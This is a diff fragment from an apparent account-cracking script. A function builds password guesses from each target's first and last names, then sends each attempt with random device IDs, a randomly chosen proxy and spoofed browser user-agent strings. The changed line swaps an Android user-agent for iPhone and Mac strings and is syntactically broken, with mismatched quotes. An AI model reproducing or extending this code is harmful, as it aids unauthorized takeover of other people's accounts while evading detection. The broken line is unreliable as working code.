@@ -484,7 +484,7 @@ def M_file_1(ids,names,passlist):
                                 
                         for pw in passlist:
                                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
-                                u1a ="[Dalvik/2.1.0 (Linux; U; Android 14.5.0; CPH2207 Build/OPR6.101106.028)"
+                                u1a ="['Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML like Gecko) CriOS/135.0.7049.83 Mobile/15E148 Safari/604.1',]"+"["Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/133.0.0.0 Safari/537.36',] 
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 nip=random.choice(proxsi)
